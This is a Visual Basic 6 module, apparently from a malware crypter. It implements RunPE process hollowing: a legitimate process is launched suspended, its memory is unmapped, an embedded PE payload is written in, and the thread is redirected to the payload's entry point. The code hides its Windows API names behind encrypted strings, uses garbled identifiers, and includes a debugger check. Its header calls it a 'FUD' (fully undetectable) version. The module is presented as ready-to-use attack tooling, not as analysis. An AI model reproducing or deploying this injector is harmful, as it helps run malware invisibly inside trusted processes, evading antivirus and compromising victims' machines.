Attribute VB_Name = "mRun"
'---------------------------------------------------------------------------------------
' Module      : mPEL
' DateTime    : 06/09/2008 23:12
' Author      : Cobein
' Mail        : cobein27@hotmail.com
' WebPage     : http://www.advancevb.com.ar
' Purpose     :
' Usage       : At your own risk
' Requirements: None
' Distribution: You can freely use this code in your own
'               applications, but you may not reproduce
'               or publish this code on any web site,
'               online service, or distribute as source
'               on any media without express permission.
'
' Credits     : RunPE based on obsol33t version, call api from rm_code
'
' History     : 06/09/2008 First Cut....................................................
'---------------------------------------------------------------------------------------

'FUD version thanks to clx

Option Explicit
Private Const CONTEXT_FULL              As Long = &H10007
Private Const MAX_PATH                  As Integer = 260
Private Const CREATE_SUSPENDED          As Long = &H4
Private Const MEM_COMMIT                As Long = &H1000
Private Const MEM_RESERVE               As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE    As Long = &H40
Private Declare Function CreateProcessA Lib "KERNEL32 " (ByVal lpAppName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare Function WriteProcessMemory Lib "KERNEL32 " (ByVal hProcess As Long, lpBaseAddress As Any, bvBuff As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Private Declare Function OutputDebugString Lib "KERNEL32 " Alias "OutputDebugStringA" (ByVal lpOutputString As String) As Long

Public Declare Sub RtlMoveMemory Lib "KERNEL32" (dest As Any, src As Any, ByVal L As Long)
Private Declare Function CallWindowProcA Lib "USER32 " (ByVal addr As Long, ByVal p1 As Long, ByVal p2 As Long, ByVal p3 As Long, ByVal p4 As Long) As Long
Private Declare Function GetProcAddress Lib "KERNEL32 " (ByVal hModule As Long, ByVal lpProcName As String) As Long
Private Declare Function LoadLibraryA Lib "KERNEL32" (ByVal lpLibFileName As String) As Long

Private Type SECURITY_ATTRIBUTES
    nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As Long
    lpDesktop As Long
    lpTitle As Long
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadID As Long
End Type

Private Type FLOATING_SAVE_AREA
    ControlWord As Long
    StatusWord As Long
    TagWord As Long
    ErrorOffset As Long
    ErrorSelector As Long
    DataOffset As Long
    DataSelector As Long
    RegisterArea(1 To 80) As Byte
    Cr0NpxState As Long
End Type

Private Type CONTEXT
    ContextFlags As Long

    Dr0 As Long
    Dr1 As Long
    Dr2 As Long
    Dr3 As Long
    Dr6 As Long
    Dr7 As Long

    FloatSave As FLOATING_SAVE_AREA
    SegGs As Long
    SegFs As Long
    SegEs As Long
    SegDs As Long
    Edi As Long
    Esi As Long
    Ebx As Long
    Edx As Long
    Ecx As Long
    Eax As Long
    Ebp As Long
    Eip As Long
    SegCs As Long
    EFlags As Long
    Esp As Long
    SegSs As Long
End Type

Private Type IMAGE_DOS_HEADER
    e_magic As Integer
    e_cblp As Integer
    e_cp As Integer
    e_crlc As Integer
    e_cparhdr As Integer
    e_minalloc As Integer
    e_maxalloc As Integer
    e_ss As Integer
    e_sp As Integer
    e_csum As Integer
    e_ip As Integer
    e_cs As Integer
    e_lfarlc As Integer
    e_ovno As Integer
    e_res(0 To 3) As Integer
    e_oemid As Integer
    e_oeminfo As Integer
    e_res2(0 To 9) As Integer
    e_lfanew As Long
End Type

Private Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    characteristics As Integer
End Type

Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type

Private Type IMAGE_OPTIONAL_HEADER
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUnitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ' NT additional fields.
    ImageBase As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    W32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    SubSystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaderFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(0 To 15) As IMAGE_DATA_DIRECTORY
End Type

Private Type IMAGE_NT_HEADERS
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type

Private Type IMAGE_SECTION_HEADER
    SecName As String * 8
    VirtualSize As Long
    VirtualAddress  As Long
    SizeOfRawData As Long
    PointerToRawData As Long
    PointerToRelocations As Long
    PointerToLinenumbers As Long
    NumberOfRelocations As Integer
    NumberOfLinenumbers As Integer
    characteristics  As Long
End Type

Public Function ThisExe() As String
    Dim lRet        As Long
    Dim bvBuff(255) As Byte
    lRet = ASD678dASDJ(StringDecrypt(Hex2Str("E5454C10656E3130"), "AxxXzSoSHunvX"), D2V1CK44J7DRI3U("I2A4GB35F2YRF6W", "7524400A2D57402A571F3B2A5319285F2475"), App.hInstance, VarPtr(bvBuff(0)), 256)
    ThisExe = Left$(StrConv(bvBuff, vbUnicode), lRet)
End Function

Sub DHFUSADifnui9asof(szProcessName As String, lpF6U6YA36T8CAP8G() As Byte)
On Error Resume Next
Dim Pidh As IMAGE_DOS_HEADER
Dim Pinh As IMAGE_NT_HEADERS
Dim Pish As IMAGE_SECTION_HEADER
Dim Si As STARTUPINFO
Dim Pi As PROCESS_INFORMATION
Dim Ctx As CONTEXT
Dim i As Long

    Si.cb = Len(Si)
    Ctx.ContextFlags = CONTEXT_FULL
    Call ASD678dASDJ(StringDecrypt(Hex2Str("E5454C10656E3130"), "AxxXzSoSHunvX"), D2V1CK44J7DRI3U("I4P3AE21G6VOU7C", "66245F0C2A44540A533B20274E"), VarPtr(Pidh), VarPtr(lpF6U6YA36T8CAP8G(0)), Len(Pidh))
    Call ASD678dASDJ(StringDecrypt(Hex2Str("E5454C10656E3130"), "AxxXzSoSHunvX"), D2V1CK44J7DRI3U("I4P3AE21G6VOU7C", "66245F0C2A44540A533B20274E"), VarPtr(Pinh), VarPtr(lpF6U6YA36T8CAP8G(Pidh.e_lfanew)), Len(Pinh))
    Call ASD678dASDJ(StringDecrypt(Hex2Str("E5454C10656E3130"), "AxxXzSoSHunvX"), D2V1CK44J7DRI3U("I7U3MT26G6BOB2E", "7427562C2057663559212A314112"), 0, StrPtr(szProcessName), 0, 0, 0, CREATE_SUSPENDED, 0, 0, VarPtr(Si), VarPtr(Pi))

    Call ASD678dASDJ(StringDecrypt(Hex2Str("E0545A126C"), "AxxXzSoSHunvX"), D2V1CK44J7DRI3U("B4Y7TY25T8JHW8N", "7A2D623A34534502512F3F185E1D27572D5E3B37"), Pi.hProcess, Pinh.OptionalHeader.ImageBase)
    Call ASD678dASDJ(StringDecrypt(Hex2Str("E5454C10656E3130"), "AxxXzSoSHunvX"), D2V1CK44J7DRI3U("B5A0OE52I7IOL7S", "6328423B30545E085B25202F722B"), Pi.hProcess, Pinh.OptionalHeader.ImageBase, Pinh.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    Call ASD678dASDJ(StringDecrypt(Hex2Str("E5454C10656E3130"), "AxxXzSoSHunvX"), D2V1CK44J7DRI3U("B2I5AB24I8FOY3F", "653B5C35276246265B233C2A7E232F5D3B4C"), Pi.hProcess, Pinh.OptionalHeader.ImageBase, VarPtr(lpF6U6YA36T8CAP8G(0)), Pinh.OptionalHeader.SizeOfHeaders, 0)

For i = 0 To Pinh.FileHeader.NumberOfSections - 1

    RtlMoveMemory Pish, lpF6U6YA36T8CAP8G(Pidh.e_lfanew + Len(Pinh) + Len(Pish) * i), Len(Pish)
    Call ASD678dASDJ(StringDecrypt(Hex2Str("E5454C10656E3130"), "AxxXzSoSHunvX"), D2V1CK44J7DRI3U("B2I5AB24I8FOY3F", "653B5C35276246265B233C2A7E232F5D3B4C"), Pi.hProcess, Pinh.OptionalHeader.ImageBase + Pish.VirtualAddress, VarPtr(lpF6U6YA36T8CAP8G(Pish.PointerToRawData)), Pish.SizeOfRawData, 0)

Next

    Call ASD678dASDJ(StringDecrypt(Hex2Str("E5454C10656E3130"), "AxxXzSoSHunvX"), D2V1CK44J7DRI3U("P2O3JW65M7UFQ1F", "752A471E3F44502C5316293F45232846"), Pi.hThread, VarPtr(Ctx))
    Call ASD678dASDJ(StringDecrypt(Hex2Str("E5454C10656E3130"), "AxxXzSoSHunvX"), D2V1CK44J7DRI3U("B2I5AB24I8FOY3F", "653B5C35276246265B233C2A7E232F5D3B4C"), Pi.hProcess, Ctx.Ebx + 8, VarPtr(Pinh.OptionalHeader.ImageBase), 4, 0)
    Ctx.Eax = Pinh.OptionalHeader.ImageBase + Pinh.OptionalHeader.AddressOfEntryPoint
    Call ASD678dASDJ(StringDecrypt(Hex2Str("E5454C10656E3130"), "AxxXzSoSHunvX"), D2V1CK44J7DRI3U("X5S6RU43M1IIQ6T", "663642063D46562C550A263F42312041"), Pi.hThread, VarPtr(Ctx))
    Call ASD678dASDJ(StringDecrypt(Hex2Str("E5454C10656E3130"), "AxxXzSoSHunvX"), D2V1CK44J7DRI3U("M0G1VM48L5VAK6L", "6222422320516C244733202F"), Pi.hThread)

End Sub

Public Function ASD678dASDJ(ByVal sLib As String, ByVal sMod As String, ParamArray Params()) As Long
    Dim bvASM(64)   As Byte 'enought to hold code + 10 params
    Dim i           As Long
    Dim lPos        As Long
    Dim sVal        As String

    bvASM(0) = &H58: bvASM(1) = &H59: bvASM(2) = &H59
    bvASM(3) = &H59: bvASM(4) = &H59: bvASM(5) = &H50
   
    lPos = 6
   
    For i = UBound(Params) To 0 Step -1
        bvASM(lPos) = &H68: lPos = lPos + 1
        sVal = (Params(i)): GoSub PutLong: lPos = lPos + 4
    Next
   
    bvASM(lPos) = &HE8: lPos = lPos + 1
    sVal = GetProcAddress(LoadLibraryA(sLib), sMod) - VarPtr(bvASM(lPos)) - 4
    GoSub PutLong: lPos = lPos + 4
    bvASM(lPos) = &HC3
    ASD678dASDJ = CallWindowProcA(VarPtr(bvASM(0)), 0, 0, 0, 0)
   
    Exit Function
PutLong:
    'This is cheap replacement for RtlMoveMemory/putmem4 (hi/lo word/byte)
    sVal = Right$(String(8, "0") & Hex(sVal), 8)
    bvASM(lPos + 0) = ("&h" & Mid$(sVal, 7, 2))
    bvASM(lPos + 1) = ("&h" & Mid$(sVal, 5, 2))
    bvASM(lPos + 2) = ("&h" & Mid$(sVal, 3, 2))
    bvASM(lPos + 3) = ("&h" & Mid$(sVal, 1, 2))
    Return
End Function

Public Function S6C7CA25P0BFR3W() As Boolean
S6C7CA25P0BFR3W = Not (OutputDebugString(VarPtr(ByVal StringDecrypt(Hex2Str("B309"), "AxxXzSoSHunvX"))) = 1)
End Function


